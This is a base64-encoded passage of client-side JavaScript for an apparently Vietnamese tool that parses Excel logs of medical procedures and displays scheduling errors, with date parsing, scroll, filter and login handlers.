0KICAgICAgICAgICAgfSk7DQogICAgICAgIH0NCg0KZnVuY3Rpb24gZGlzcGxheUVycm9ycygpIHsNCiAgICBjb25zdCBlcnJvckxvZ0RpdiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdlcnJvckxvZycpOw0KICAgIA0KICAgIGlmIChlcnJvckxvZy5sZW5ndGggPT09IDApIHsNCiAgICAgICAgZXJyb3JMb2dEaXYuaW5uZXJIVE1MID0gJzxwPktow7RuZyBjw7MgbOG7l2kgbsOgbyDEkcaw4bujYyBnaGkgbmjhuq1uPC9wPic7DQogICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdlcnJvclNlY3Rpb24nKS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgICAgICANCiAgICAgICAgLy8gTuG6v3Uga2jDtG5nIGPDsyBs4buXaSwgY3Xhu5luIHh14buRbmcgcGjhuqduIEvhur90IFF14bqjIEtp4buDbSBUcmENCiAgICAgICAgc2V0VGltZW91dCgoKSA9PiB7DQogICAgICAgICAgICBjb25zdCByZXN1bHRTZWN0aW9uID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Jlc3VsdFNlY3Rpb24nKTsNCiAgICAgICAgICAgIGlmIChyZXN1bHRTZWN0aW9uICYmIHJlc3VsdFNlY3Rpb24uc3R5bGUuZGlzcGxheSAhPT0gJ25vbmUnKSB7DQogICAgICAgICAgICAgICAgc21vb3RoU2Nyb2xsVG8ocmVzdWx0U2VjdGlvbiwgLTQwKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSwgMzAwKTsNCiAgICAgICAgcmV0dXJuOw0KICAgIH0NCiAgICANCiAgICBsZXQgaHRtbCA9IGANCiAgICA8dGFibGUgY2xhc3M9ImVycm9yLXRhYmxlIj4NCiAgICAgICAgPHRoZWFkPg0KICAgICAgICAgICAgPHRyPg0KICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLXVzZXIgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFTDqm4gQk48L3RoPg0KICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtcHJvY2VkdXJlcyBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVGjhu6cgdGh14bqtdDwvdGg+DQogICAgICAgICAgICA8dGggY2xhc3M9ImRvY3Rvci1jb2x1bW4iPjxpIGNsYXNzPSJmYXMgZmEtdXNlci1tZCBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gQsOhYyBz4bu5IGNo4buJIMSR4buLbmg8L3RoPg0KICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlci1udXJzZSBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTmfGsOG7nWkgdGjhu7FjIGhp4buHbjwvdGg+DQogICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhciBmYS1jbG9jayBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVGjhu51pIGdpYW48L3RoPg0KICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtZXhjbGFtYXRpb24tdHJpYW5nbGUgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IEzhu5dpPC90aD4NCiAgICAgICAgICAgIDwvdHI+DQogICAgICAgIDwvdGhlYWQ+DQogICAgICAgIDx0Ym9keT5gOw0KICAgIA0KICAgIC8vIEhp4buDbiB0aOG7iyB04burbmcgbOG7l2kNCiAgICBlcnJvckxvZy5mb3JFYWNoKGVycm9yID0+IHsNCiAgICAgICAgaWYgKGVycm9yLmRldGFpbHMpIHsNCiAgICAgICAgICAgIGh0bWwgKz0gYA0KICAgICAgICAgICAgPHRyIGNsYXNzPSJlcnJvci1yb3ciPg0KICAgICAgICAgICAgICAgIDx0ZD4ke2Vycm9yLmRldGFpbHMucGF0aWVudE5hbWUgfHwgJ0tow7RuZyBjw7MnfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkPiR7ZXJyb3IuZGV0YWlscy5wcm9jZWR1cmUgfHwgJ0tow7RuZyBjw7MnfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkIGNsYXNzPSJkb2N0b3ItY29sdW1uIj4ke2Vycm9yLmRldGFpbHMuZG9jdG9yIHx8ICdLaMO0bmcgY8OzJ308L3RkPg0KICAgICAgICAgICAgICAgIDx0ZD4ke2Vycm9yLmRldGFpbHMub3BlcmF0b3IgPyBlcnJvci5kZXRhaWxzLm9wZXJhdG9yLnJlcGxhY2UoLywvZywgJycpIDogJ0tow7RuZyBjw7MnfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkPjxjZW50ZXI+JHtlcnJvci5kZXRhaWxzLm5nYXlUaHVjSGllbiB8fCAoZXJyb3IuZGV0YWlscy5kYXRlIHx8ICdLaMO0bmcgY8OzJyl9IDxici8+JHtlcnJvci5kZXRhaWxzLnN0YXJ0VGltZSA/IGAke2Vycm9yLmRldGFpbHMuc3RhcnRUaW1lfSAtICR7ZXJyb3IuZGV0YWlscy5lbmRUaW1lfWAgOiAnS2jDtG5nIGPDsyd9PC9jZW50ZXI+PC90ZD4NCiAgICAgICAgICAgICAgICA8dGQgY2xhc3M9ImVycm9yLWRldGFpbCI+DQogICAgICAgICAgICAgICAgICAgICR7ZXJyb3IubWVzc2FnZX0NCiAgICAgICAgICAgICAgICAgICAgPGI+PGZvbnQgY29sb3I9InJlZCI+JHtlcnJvci5kZXRhaWxzLmV4cGVjdGVkID8gYCR7ZXJyb3IuZGV0YWlscy5hY3R1YWx9IHBow7p0PC9mb250PjwvYj4gICAoUXV5IMSR4buLbmg6ICR7ZXJyb3IuZGV0YWlscy5leHBlY3RlZH0gcGjDunQpYCA6ICcnfQ0KICAgICAgICAgICAgICAgIDwvdGQ+DQogICAgICAgICAgICA8L3RyPmA7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICBodG1sICs9IGANCiAgICAgICAgICAgIDx0ciBjbGFzcz0iZXJyb3Itcm93Ij4NCiAgICAgICAgICAgICAgICA8dGQgY29sc3Bhbj0iNiIgY2xhc3M9ImVycm9yLWRldGFpbCI+DQogICAgICAgICAgICAgICAgICAgICR7ZXJyb3IubWVzc2FnZX0gJHtlcnJvci5yb3cgPyAnKETDsm5nICcgKyBlcnJvci5yb3cgKyAnKScgOiAnJ30NCiAgICAgICAgICAgICAgICA8L3RkPg0KICAgICAgICAgICAgPC90cj5gOw0KICAgICAgICB9DQogICAgfSk7DQogICAgDQogICAgaHRtbCArPSBgPC90Ym9keT48L3RhYmxlPmA7DQogICAgDQogICAgZXJyb3JMb2dEaXYuaW5uZXJIVE1MID0gaHRtbDsNCiAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdlcnJvclNlY3Rpb24nKS5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICANCiAgICAvLyBDdeG7mW4geHXhu5FuZyBwaOG6p24gbOG7l2kgbuG6v3UgY8OzDQogICAgc2V0VGltZW91dCgoKSA9PiB7DQogICAgICAgIGNvbnN0IGVycm9yU2VjdGlvbiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdlcnJvclNlY3Rpb24nKTsNCiAgICAgICAgaWYgKGVycm9yU2VjdGlvbikgew0KICAgICAgICAgICAgc21vb3RoU2Nyb2xsVG8oZXJyb3JTZWN0aW9uLCAtMTMwKTsNCiAgICAgICAgfQ0KICAgIH0sIDMwMCk7DQp9DQoNCi8vIEjDoG0gY3Xhu5luIG3GsOG7o3QgdOG7lW5nIHF1w6F0DQpmdW5jdGlvbiBzbW9vdGhTY3JvbGxUbyhlbGVtZW50LCBvZmZzZXQgPSAwKSB7DQogICAgZWxlbWVudC5jbGFzc0xpc3QuYWRkKCdoaWdobGlnaHQtZXJyb3Itc2VjdGlvbicpOw0KICAgIA0KICAgIGNvbnN0IGVsZW1lbnRQb3NpdGlvbiA9IGVsZW1lbnQuZ2V0Qm91bmRpbmdDbGllbnRSZWN0KCkudG9wOw0KICAgIGNvbnN0IG9mZnNldFBvc2l0aW9uID0gZWxlbWVudFBvc2l0aW9uICsgd2luZG93LnBhZ2VZT2Zmc2V0IC0gb2Zmc2V0Ow0KICAgIA0KICAgIGNvbnN0IGR1cmF0aW9uID0gMTUwMDsNCiAgICBjb25zdCBzdGFydCA9IHdpbmRvdy5wYWdlWU9mZnNldDsNCiAgICBjb25zdCBzdGFydFRpbWUgPSBwZXJmb3JtYW5jZS5ub3coKTsNCiAgICANCiAgICBmdW5jdGlvbiBzY3JvbGxTdGVwKHRpbWVzdGFtcCkgew0KICAgICAgICBjb25zdCBlbGFwc2VkID0gdGltZXN0YW1wIC0gc3RhcnRUaW1lOw0KICAgICAgICBjb25zdCBwcm9ncmVzcyA9IE1hdGgubWluKGVsYXBzZWQgLyBkdXJhdGlvbiwgMSk7DQogICAgICAgIGNvbnN0IGVhc2luZyA9IGVhc2VJbk91dEN1YmljKHByb2dyZXNzKTsNCiAgICAgICAgd2luZG93LnNjcm9sbFRvKDAsIHN0YXJ0ICsgKG9mZnNldFBvc2l0aW9uIC0gc3RhcnQpICogZWFzaW5nKTsNCiAgICAgICAgDQogICAgICAgIGlmIChwcm9ncmVzcyA8IDEpIHsNCiAgICAgICAgICAgIHdpbmRvdy5yZXF1ZXN0QW5pbWF0aW9uRnJhbWUoc2Nyb2xsU3RlcCk7DQogICAgICAgIH0NCiAgICB9DQogICAgDQogICAgZnVuY3Rpb24gZWFzZUluT3V0Q3ViaWModCkgew0KICAgICAgICByZXR1cm4gdCA8IDAuNSA/IDQgKiB0ICogdCAqIHQgOiAxIC0gTWF0aC5wb3coLTIgKiB0ICsgMiwgMykgLyAyOw0KICAgIH0NCiAgICANCiAgICB3aW5kb3cucmVxdWVzdEFuaW1hdGlvbkZyYW1lKHNjcm9sbFN0ZXApOw0KICAgIA0KICAgIHNldFRpbWVvdXQoKCkgPT4gew0KICAgICAgICBlbGVtZW50LmNsYXNzTGlzdC5yZW1vdmUoJ2hpZ2hsaWdodC1lcnJvci1zZWN0aW9uJyk7DQogICAgfSwgMjAwMCk7DQp9DQoNCg0KIC8vID09PT09PSBC4bquVCBT4buwIEtJ4buGTiBDSEVDS0JPWCAiQ2jhu4kgaGnhu4NuIHRo4buLIG5nw6B5IHPhuq9jIHRodeG7kWMgbOG7l2kiID09PT09PQ0KZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Nob3dIZXJiRXJyb3JEYXlzQ2hlY2tib3gnKS5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCBmdW5jdGlvbiAoKSB7DQogICAgY29uc3Qgc2hvd09ubHlFcnJvckRheXMgPSB0aGlzLmNoZWNrZWQ7DQoNCiAgICAvLyAxLiBM4bqleSB0b8OgbiBi4buZIG5nw6B5IHThu6sgYWxsUHJvY2VkdXJlcw0KICAgIGNvbnN0IGFsbERhdGVzID0gWy4uLm5ldyBTZXQoYWxsUHJvY2VkdXJlcy5tYXAocCA9PiBwLmRhdGUpKV07DQoNCiAgICAvLyAyLiBO4bq/dSBi4bqtdCBjaGVja2JveCAtPiBjaOG7iSBnaeG7ryBuZ8OgeSBjw7Mgc+G6r2MgdGh14buRYyBs4buXaQ0KICAgIGxldCBkYXRlc1RvU2hvdyA9IGFsbERhdGVzOw0KICAgIGlmIChzaG93T25seUVycm9yRGF5cykgew0KICAgICAgICBjb25zdCBoZXJiRGF0ZXMgPSBuZXcgU2V0KCh3aW5kb3cuYWxsSGVyYlByb2NlZHVyZXMgfHwgW10pLm1hcChoID0+IGguZGF0ZSkpOw0KICAgICAgICBkYXRlc1RvU2hvdyA9IGFsbERhdGVzLmZpbHRlcihkID0+IGhlcmJEYXRlcy5oYXMoZCkpOw0KICAgIH0NCg0KICAgIC8vIDMuIEPhuq1wIG5o4bqtdCBkcm9wZG93biBHaeG7nSB0cuG7kW5nIChmaWx0ZXJEYXRlKQ0KICAgIGNvbnN0IGZpbHRlckRhdGVTZWxlY3QgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZmlsdGVyRGF0ZScpOw0KICAgIGlmIChmaWx0ZXJEYXRlU2VsZWN0KSB7DQogICAgICAgIGZpbHRlckRhdGVTZWxlY3QuaW5uZXJIVE1MID0gYDxvcHRpb24gdmFsdWU9ImFsbCI+VOG6pXQgY+G6ozwvb3B0aW9uPmAgKw0KICAgICAgICAgICAgZGF0ZXNUb1Nob3cubWFwKGQgPT4gYDxvcHRpb24gdmFsdWU9IiR7ZH0iPiR7ZH08L29wdGlvbj5gKS5qb2luKCcnKTsNCiAgICB9DQoNCiAgICAvLyA0LiBD4bqtcCBuaOG6rXQgZHJvcGRvd24gU+G6r2MgdGh14buRYyB0aGFuZyAoaGVyYkRhdGVGaWx0ZXIpDQogICAgY29uc3QgaGVyYkRhdGVTZWxlY3QgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYkRhdGVGaWx0ZXInKTsNCiAgICBpZiAoaGVyYkRhdGVTZWxlY3QpIHsNCiAgICAgICAgaGVyYkRhdGVTZWxlY3QuaW5uZXJIVE1MID0gYDxvcHRpb24gdmFsdWU9ImFsbCI+VOG6pXQgY+G6ozwvb3B0aW9uPmAgKw0KICAgICAgICAgICAgZGF0ZXNUb1Nob3cubWFwKGQgPT4gYDxvcHRpb24gdmFsdWU9IiR7ZH0iPiR7ZH08L29wdGlvbj5gKS5qb2luKCcnKTsNCiAgICB9DQp9KTsNCg0KDQogICAgICAgIGZ1bmN0aW9uIHBhcnNlRGF0ZVRpbWUoZGF0ZXRpbWVTdHIsIHJvd0luZGV4KSB7DQogICAgICAgICAgICB0cnkgew0KICAgICAgICAgICAgICAgIGlmICghZGF0ZXRpbWVTdHIpIHsNCiAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gbnVsbDsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgaWYgKHR5cGVvZiBkYXRldGltZVN0ciA9PT0gJ251bWJlcicpIHsNCiAgICAgICAgICAgICAgICAgICAgY29uc3QgZXhjZWxEYXRlID0gbmV3IERhdGUoTWF0aC5yb3VuZCgoZGF0ZXRpbWVTdHIgLSAyNTU2OSkgKiA4NjQwMCAqIDEwMDApKTsNCiAgICAgICAgICAgICAgICAgICAgY29uc3QgZGF5ID0gZXhjZWxEYXRlLmdldERhdGUoKTsNCiAgICAgICAgICAgICAgICAgICAgY29uc3QgbW9udGggPSBleGNlbERhdGUuZ2V0TW9udGgoKSArIDE7DQogICAgICAgICAgICAgICAgICAgIGNvbnN0IHllYXIgPSBleGNlbERhdGUuZ2V0RnVsbFllYXIoKTsNCiAgICAgICAgICAgICAgICAgICAgY29uc3QgaG91cnMgPSBleGNlbERhdGUuZ2V0SG91cnMoKTsNCiAgICAgICAgICAgICAgICAgICAgY29uc3QgbWludXRlcyA9IGV4Y2VsRGF0ZS5nZXRNaW51dGVzKCk7DQogICAgICAgICAgICAgICAgICAgIGNvbnN0IHNlY29uZHMgPSBleGNlbERhdGUuZ2V0U2Vjb25kcygpOw0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGRhdGVPYmo6IGV4Y2VsRGF0ZSwNCiAgICAgICAgICAgICAgICAgICAgICAgIGRhdGVLZXk6IGAke2RheX0vJHttb250aH0vJHt5ZWFyfWAsDQogICAgICAgICAgICAgICAgICAgICAgICBtaW51dGVzOiBob3VycyAqIDYwICsgbWludXRlcywNCiAgICAgICAgICAgICAgICAgICAgICAgIHNlY29uZHM6IGhvdXJzICogMzYwMCArIG1pbnV0ZXMgKiA2MCArIHNlY29uZHMsDQogICAgICAgICAgICAgICAgICAgICAgICBkaXNwbGF5VGltZTogYCR7aG91cnMudG9TdHJpbmcoKS5wYWRTdGFydCgyLCAnMCcpfToke21pbnV0ZXMudG9TdHJpbmcoKS5wYWRTdGFydCgyLCAnMCcpfToke3NlY29uZHMudG9TdHJpbmcoKS5wYWRTdGFydCgyLCAnMCcpfWANCiAgICAgICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICB9IA0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIGlmICh0eXBlb2YgZGF0ZXRpbWVTdHIgPT09ICdzdHJpbmcnKSB7DQogICAgICAgICAgICAgICAgICAgIGxldCBkYXRlUGFydCwgdGltZVBhcnQgPSAnMDA6MDA6MDAnOw0KICAgICAgICAgICAgICAgICAgICBpZiAoZGF0ZXRpbWVTdHIuaW5jbHVkZXMoJyAnKSkgW2RhdGVQYXJ0LCB0aW1lUGFydF0gPSBkYXRldGltZVN0ci5zcGxpdCgnICcpOw0KICAgICAgICAgICAgICAgICAgICBlbHNlIGRhdGVQYXJ0ID0gZGF0ZXRpbWVTdHI7DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBsZXQgZGF5LCBtb250aCwgeWVhcjsNCiAgICAgICAgICAgICAgICAgICAgaWYgKGRhdGVQYXJ0LmluY2x1ZGVzKCcvJykpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IHBhcnRzID0gZGF0ZVBhcnQuc3BsaXQoJy8nKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChwYXJ0cy5sZW5ndGggPT09IDMpIFtkYXksIG1vbnRoLCB5ZWFyXSA9IHBhcnRzLm1hcChOdW1iZXIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSBpZiAocGFydHMubGVuZ3RoID09PSAyKSBbZGF5LCBtb250aF0gPSBwYXJ0cy5tYXAoTnVtYmVyKSwgeWVhciA9IG5ldyBEYXRlKCkuZ2V0RnVsbFllYXIoKTsNCiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmIChkYXRlUGFydC5pbmNsdWRlcygnLScpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBwYXJ0cyA9IGRhdGVQYXJ0LnNwbGl0KCctJyk7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAocGFydHMubGVuZ3RoID09PSAzKSBbeWVhciwgbW9udGgsIGRheV0gPSBwYXJ0cy5tYXAoTnVtYmVyKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgaWYgKHBhcnRzLmxlbmd0aCA9PT0gMikgW21vbnRoLCBkYXldID0gcGFydHMubWFwKE51bWJlciksIHllYXIgPSBuZXcgRGF0ZSgpLmdldEZ1bGxZZWFyKCk7DQogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB0aHJvdyBuZXcgRXJyb3IoJ8SQ4buLbmggZOG6oW5nIG5nw6B5IGtow7RuZyDEkcaw4bujYyBo4buXIHRy4bujJyk7DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBpZiAoaXNOYU4oZGF5KSB8fCBpc05hTihtb250aCkgfHwgaXNOYU4oeWVhcikgfHwgZGF5IDwgMSB8fCBkYXkgPiAzMSB8fCBtb250aCA8IDEgfHwgbW9udGggPiAxMikgew0KICAgICAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IEVycm9yKCdHacOhIHRy4buLIG5nw6B5IGtow7RuZyBo4bujcCBs4buHJyk7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIGxldCBob3VycyA9IDAsIG1pbnV0ZXMgPSAwLCBzZWNvbmRzID0gMDsNCiAgICAgICAgICAgICAgICAgICAgaWYgKHRpbWVQYXJ0LmluY2x1ZGVzKCc6JykpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IHRpbWVQYXJ0cyA9IHRpbWVQYXJ0LnNwbGl0KCc6Jyk7DQogICAgICAgICAgICAgICAgICAgICAgICBob3VycyA9IHBhcnNlSW50KHRpbWVQYXJ0c1swXSkgfHwgMDsNCiAgICAgICAgICAgICAgICAgICAgICAgIG1pbnV0ZXMgPSBwYXJzZUludCh0aW1lUGFydHNbMV0pIHx8IDA7DQogICAgICAgICAgICAgICAgICAgICAgICBzZWNvbmRzID0gcGFyc2VJbnQodGltZVBhcnRzWzJdKSB8fCAwOw0KICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoaXNOYU4oaG91cnMpIHx8IGlzTmFOKG1pbnV0ZXMpIHx8IGlzTmFOKHNlY29uZHMpIHx8IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGhvdXJzIDwgMCB8fCBob3VycyA+IDIzIHx8IG1pbnV0ZXMgPCAwIHx8IG1pbnV0ZXMgPiA1OSB8fCBzZWNvbmRzIDwgMCB8fCBzZWNvbmRzID4gNTkpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2dFcnJvcignR2nDoSB0cuG7iyB0aOG7nWkgZ2lhbiBraMO0bmcgaOG7o3AgbOG7hycsIHJvd0luZGV4LCB7IHRpbWU6IHRpbWVQYXJ0IH0pOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGhvdXJzID0gMDsgbWludXRlcyA9IDA7IHNlY29uZHMgPSAwOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBjb25zdCBkYXRlT2JqID0gbmV3IERhdGUoeWVhciwgbW9udGggLSAxLCBkYXksIGhvdXJzLCBtaW51dGVzLCBzZWNvbmRzKTsNCiAgICAgICAgICAgICAgICAgICAgaWYgKGlzTmFOKGRhdGVPYmouZ2V0VGltZSgpKSkgdGhyb3cgbmV3IEVycm9yKCdOZ8OgeSBraMO0bmcgaOG7o3AgbOG7hycpOw0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgY29uc3Qgc2Vjb25kc0luRGF5ID0gaG91cnMgKiAzNjAwICsgbWludXRlcyAqIDYwICsgc2Vjb25kczsNCiAgICAgICAgICAgICAgICAgICAgY29uc3QgbWludXRlc0luRGF5ID0gaG91cnMgKiA2MCArIG1pbnV0ZXM7DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gew0KICAgICAgICAgICAgICAgICAgICAgICAgZGF0ZU9iaiwNCiAgICAgICAgICAgICAgICAgICAgICAgIGRhdGVLZXk6IGAke2RheX0vJHttb250aH0vJHt5ZWFyfWAsDQogICAgICAgICAgICAgICAgICAgICAgICBtaW51dGVzOiBtaW51dGVzSW5EYXksDQogICAgICAgICAgICAgICAgICAgICAgICBzZWNvbmRzOiBzZWNvbmRzSW5EYXksDQogICAgICAgICAgICAgICAgICAgICAgICBkaXNwbGF5VGltZTogYCR7aG91cnMudG9TdHJpbmcoKS5wYWRTdGFydCgyLCAnMCcpfToke21pbnV0ZXMudG9TdHJpbmcoKS5wYWRTdGFydCgyLCAnMCcpfToke3NlY29uZHMudG9TdHJpbmcoKS5wYWRTdGFydCgyLCAnMCcpfWANCiAgICAgICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgdGhyb3cgbmV3IEVycm9yKCfEkOG7i25oIGThuqFuZyB0aOG7nWkgZ2lhbiBraMO0bmcgxJHGsOG7o2MgaOG7lyB0cuG7oycpOw0KICAgICAgICAgICAgfSBjYXRjaCAoZXJyb3IpIHsNCiAgICAgICAgICAgICAgICBsb2dFcnJvcihgTOG7l2kgcGjDom4gdMOtY2ggdGjhu51pIGdpYW46ICR7ZXJyb3IubWVzc2FnZX1gLCByb3dJbmRleCwgeyANCiAgICAgICAgICAgICAgICAgICAgdmFsdWU6IGRhdGV0aW1lU3RyLA0KICAgICAgICAgICAgICAgICAgICBlcnJvckRldGFpbHM6IGVycm9yLnN0YWNrIA0KICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgICAgIHJldHVybiBudWxsOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgLy8gPT09PT09PT09PSBLSOG7nkkgVOG6oE8gU+G7sCBLSeG7hk4gPT09PT09PT09PSAvLw0KICAgICAgICBkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdET01Db250ZW50TG9hZGVkJywgZnVuY3Rpb24oKSB7DQoJCWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd1c2VybmFtZUlucHV0JykuZm9jdXMoKTsNCiAgICAgICAgICAgIC8vIEtoaSB0cmFuZyBsb2FkDQogICAgICAgICAgICBpZiAoIXNlc3Npb25TdG9yYWdlLmdldEl0ZW0oJ21lZFVzZXInKSkgew0KICAgICAgICAgICAgICAgIGRvY3VtZW50LmJvZHkuY2xhc3NMaXN0LmFkZCgnbG9naW4tcGFnZScpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgDQogICAgICAgICAgICAvLyBLaeG7g20gdHJhIMSRxINuZyBuaOG6rXAga2hpIHRyYW5nIHThuqNpDQoJCQ0KCQkJDQogICAgICAgICAgICBjaGVja1NhdmVkTG9naW4oKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgLy8gR8OhbiBz4buxIGtp4buHbiBjaG8gbsO6dCDEkcSDbmcgbmjhuq1wDQogICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9naW5CdG4nKS5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsICgpID0+IHsNCiAgICBpc0xvZ2luQWN0aW9uID0gdHJ1ZTsgLy8g4pyFIFRow6ptIGTDsm5nIG7DoHkNCiAgICBjaGVja0xvZ2luKCk7DQp9KTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgLy8gR8OhbiBz4buxIGtp4buHbiBjaG8gbsO6dCDEkcSDbmcgeHXhuqV0DQogICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9nb3V0QnRuJykuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCAoKSA9PiB7DQogICAgaXNMb2dpbkFjdGlvbiA9IGZhbHNlOyAvLyDinIUgVGjDqm0gZMOybmcgbsOgeQ0KICAgIGxvZ291dCgpOw0KfSk7DQoNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgLy8gxJDEg25nIG5o4bqtcCBi4bqxbmcgcGjDrW0gRW50ZXINCiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXNzd29yZElucHV0JykuYWRkRXZlbnRMaXN0ZW5lcigna2V5dXAnLCBmdW5jdGlvbihldmVudCkgew0KICAgICAgICAgICAgICAgIGlmIChldmVudC5rZXkgPT09ICdFbnRlcicpIHsNCiAgICAgICAgICAgICAgICAgICAgY2hlY2tMb2dpbigpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAvLyBHw6FuIHPhu7Ega2nhu4duIGNobyBuw7p0IHBow6JuIHTDrWNoIGZpbGUNCiAgICAgICAgICAgIA0KZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2FuYWx5emVCdG4nKS5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsIGFzeW5jICgpID0+IHsNCiAgYXdhaXQgZW5zdXJlWExTWCgpOyAvLyBu4bqhcCBYTFNYIMSRw7puZyBsw7pjIGTDuW5nDQogICAgY29uc3QgZmlsZSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmaWxlSW5wdXQnKS5maWxlc1swXTsNCmlmICghZmlsZSkgew0KICAgIGNvbnN0IHBvcHVwID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvYWRpbmdQb3B1cCcpOw0KICAgIGNvbnN0IGxvYWRpbmdUZXh0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvYWRpbmdUZXh0Jyk7DQogICAgY29uc3QgcHJvZ3Jlc3NCYXIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncHJvZ3Jlc3NCYXInKTsNCg0KICAgIGxvYWRpbmdUZXh0LmlubmVySFRNTCA9IGANCiAgICAgICAgPGkgY2xhc3M9ImZhcyBmYS1leGNsYW1hdGlvbi10cmlhbmdsZSIgc3R5bGU9ImZvbnQtc2l6ZToyNHB4O2NvbG9yOnJlZDttYXJnaW4tYm90dG9tOjEwcHg7Ij48L2k+PGJyLz4NCiAgICAgICAgPHN0cm9uZz5WdWkgbMOybmcgY2jhu41uIGZpbGUgdHLGsOG7m2Mga2hpIGtp4buDbSB0cmE8L3N0cm9uZz48YnIvPjxici8+DQogICAgICAgIDxidXR0b24gY2xhc3M9ImJ0biIgb25jbGljaz0iZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvYWRpbmdQb3B1cCcpLnN0eWxlLmRpc3BsYXk9J25vbmUnIj7EkMOzbmc8L2J1dHRvbj4NCiAgICBgOw0KICAgIHByb2dyZXNzQmFyLnN0eWxlLndpZHRoID0gJzAlJzsNCiAgICANCiAgICBwb3B1cC5zdHlsZS5kaXNwbGF5ID0gJ2ZsZXgnOw0KICAgIHBvcHVwLmNsYXNzTGlzdC5hZGQoJ3Nob3cnKTsNCiAgICByZXR1cm47DQp9DQoNCg0KICAgIGNvbnN0IHBvcHVwID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvYWRpbmdQb3B1cCcpOw0KICAgIGNvbnN0IGxvYWRpbmdUZXh0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvY